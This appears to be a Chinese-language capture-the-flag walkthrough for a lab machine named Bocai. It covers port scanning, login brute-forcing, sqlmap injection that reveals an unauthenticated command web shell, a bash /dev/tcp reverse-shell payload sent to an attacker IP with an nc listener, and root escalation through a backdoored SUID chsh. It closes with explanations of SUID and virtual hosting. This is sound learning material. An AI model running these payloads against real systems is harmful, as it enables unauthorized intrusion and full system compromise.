---
tags:
  - "#靶机学习"
  - "#命令注入"
  - "#shell重定向"
  - "#Virtual-Hosting"
title: Bocai
author: 冰冰洁
date: 2026-11-04 20:00
subtitle: 利用虚拟主机、SQL 注入与 SUID 程序完成 Bocai 靶场
---
# 信息收集

依旧是端口扫描：

```bash
nmap -p- 192.168.56.105
```

得到的信息是靶机在80端口有http服务，于是查看对应界面，发现是一个安全文件分享系统

![[Pasted image 20261104185635.png]]

点击图中深蓝色按钮尝试进入系统，但是报错说找不到服务器对应的ip，因此我们需要首先找到这个Bocai域名，将我们靶机的ip对应上去：

![[Pasted image 20261104193141.png]]

```bash
echo '192.168.56.105 h9q3dxvoaj2rrs5b4a4n.bocai.dsz' | sudo tee -a /etc/hosts
```

使用终端添加映射，然后再访问对应界面：

![[Pasted image 20261104193410.png]]

成功。然后接下来要爆破这个用户名和用户密码。wp中直接使用弱口令爆破，为了强化自己学习打靶机的能力，尝试使用yakit来爆破这个正确的用户名和用户密码：

![[Pasted image 20261104194037.png]]

随便抓包一个错误答案，然后将其改成对应的字典tag

辗转试了几次，响应状态都为302，于是尝试确定username试着爆破

![[Pasted image 20261104194611.png]]

发现跳转到一个dashboard的地方，其他的payloads都没有显示这个地址，所以确定这个是正确的，但是筛选的条件需要更改，这次爆破yakit将所有都显示为成功。

不再纠结于这个点，直接使用得到的密码和用户名登录

![[Pasted image 20261104195305.png]]

发现一个很像数据库的表，猜测这里有sql注入，但是在这个界面并没有找到能够进行sql注入的地方，这知识一个窗口，于是我们想起来在抓包时源码中发现一个资源界面，里面表示要用`http:xxxxx`登录，xxxx不是虚拟机ip

![[Pasted image 20261105150314.png]]

再去抓包界面，发现这里的`url`也不是我们使用的那个。于是修改url访问，发现可能的注入点：

![[Pasted image 20261105150632.png]]

## 漏洞利用

使用以下命令判断是否存在sql注入：

```bash
sqlmap -r ~/2.req -p id --batch --flush-session -v 3
```

结果显示存在多种注入方法，于是直接开始注入：

```bash
 sqlmap -r ~/2.req -p id --batch --dbs #查找可能的数据库
 sqlmap -r ~/2.req -p id --batch -D bocai_admin --tables #枚举数据库中的表
 sqlmap -r 2.req -p id --batch -D bocai_admin -T temp --dump #查看对应表中的内容
```

得到如下结果：

![[Pasted image 20261106141647.png]]

![[Pasted image 20261106141911.png]]

可以看到表temp下有一个内容：

```
 If the panel goes down, use the standalone maintenance shell in the web root: http://h9q3DXVOaJ2rRs5B4A4N.bocai.dsz/dnYbOmNcrPCO1P6NNxAB.php - no auth needed, keep this internal.

如果控制面板无法访问，请使用位于网站根目录下的独立维护 Shell：http://h9q3DXVOaJ2rRs5B4A4N.bocai.dsz/dnYbOmNcrPCO1P6NNxAB.php —— 无需身份验证，请仅限内部使用。
```

于是访问对应的页面，发现真的可以使用cmd参数传入bash命令然后执行。

所以接下来要想办法将靶机shell反弹到我们的攻击机上，这里我们使用以下方法：

我们要抓到靶机能够执行我们传入的命令这个点，因此使用这个点使靶机把他的终端反弹到攻击机上，因此我们构造以下payload：

```bash
bash -c 'bash -i >& /dev/tcp/192.168.64.39/4444 0>&1'
```

- `bash -c`:表示启动一个 Bash，然后执行引号中的命令。
- `bash -i`：`-i` 表示启动交互式 Bash。交互式 Shell 会尝试读取用户输入，并在执行后输出结果。但是普通情况下，这个 Bash 的输入输出连接着本地终端
- `/dev/tcp/192.168.64.39/4444`：是 Bash 提供的特殊网络路径功能。当 Bash 在重定向中打开这个路径时，会尝试建立 TCP 连接：该ip对应的端口
- `>&`：将标准输出和标准错误一起重定向到指定位置。

首先我们监听本机的`4444`端口：

```bash
nc -lnvp 4444
```

然后使用那个网页让靶机运行我们构造的payload。将shell反弹到本机。

![[Pasted image 20261106144410.png]]

成功。

![[Pasted image 20261106144614.png]]

整体流程如下：

![[Pasted image 20261106144841.png]]

# root

使用

```bash
dpkg -V
```

![[Pasted image 20261106145402.png]]

发现`/usr/bin/chsh`这个文件MD5 校验值发生变化，说明这个文件可能被人修改过

其中`/usr/bin/chsh` 是 SUID 文件，因此进一步查看：

```bash
ls -la /usr/bin/chsh
strings /usr/bin/chsh
```

![[Pasted image 20261106145740.png]]

这里的 `s` 表示设置了 SUID 位。

由于文件所有者是 root，执行该程序时通常会以文件所有者的有效 UID 运行，也就是 root 权限。

![[Pasted image 20261106145854.png]]

接下来尝试这个隐形参数：

```bash
/usr/bin/chsh --maze
```

![[Pasted image 20261106150203.png]]

成功以`root`登录

# 知识点

## 1. `/usr/bin/chsh` 原本是 Linux 的什么程序，为什么它具有 SUID 权限？

`chsh` 是 Linux 中用于 Change Shell（修改登录 Shell） 的系统程序。

通常用户可以执行：

```
chsh
```

或者：

```
chsh -s /bin/bash
```

其中：

- `chsh`：修改当前用户的登录 Shell。
    
- `-s`：指定新的 Shell。
    
- `/bin/bash`：希望设置的登录 Shell。
    

例如，Linux 用户的默认登录 Shell 可能是：

```
/bin/sh
```

执行：

```
chsh -s /bin/bash
```

之后，该用户的登录 Shell 就可以变成 `/bin/bash`。

### 为什么 chsh 通常具有 SUID？

因为修改用户登录 Shell 涉及 `/etc/passwd` 等系统账户信息，而普通用户通常没有直接修改这些文件的权限。

因此，系统中的 `chsh` 通常具有：

```
-rwsr-xr-x root root
```

这里的 `s` 表示 SUID。

当普通用户执行 `chsh` 时，程序可以在受控条件下以 root 的有效 UID 运行，从而完成允许的账户修改操作。

注意：SUID 并不意味着程序中的所有操作都可以无限制地使用 root 权限。

## 2. 为什么 Bocai 的 WP 中域名访问和 IP 访问页面不同？

![[Pasted image 20261105150545.png]]


![[Pasted image 20261105150603.png]]

这个现象最核心的原因是：HTTP 请求中的 Host 请求头不同，服务器可能根据 Host 将请求分发到不同的网站。

这种技术叫做：

虚拟主机 Virtual Hosting

### 1. 先理解 HTTP 的 Host

假设你访问：

```
http://192.168.64.91/
```

浏览器发送：

```
GET / HTTP/1.1
Host: 192.168.64.91
```

而访问：

```
http://h9q3dxvoaj2rrs5b4a4n.bocai.dsz/
```

浏览器发送：

```
GET / HTTP/1.1
Host: h9q3dxvoaj2rrs5b4a4n.bocai.dsz
```

虽然这两个请求最终可能到达同一台服务器，但 Host 字段不同。

### 2. Nginx / Apache 可以根据 Host 选择网站

假设服务器配置了两个虚拟主机：

```
server {
    listen 80;
    server_name 192.168.64.91;

    root /var/www/default;
}

server {
    listen 80;
    server_name h9q3dxvoaj2rrs5b4a4n.bocai.dsz;

    root /var/www/bocai;
}
```

那么：

|访问方式|Host|服务器返回|
|---|---|---|
|IP 访问|192.168.64.91|默认网站|
|域名访问|h9q3dxvoaj2rrs5b4a4n.bocai.dsz|Bocai 网站|

这就解释了为什么同一个 IP 可能对应多个不同的网站。
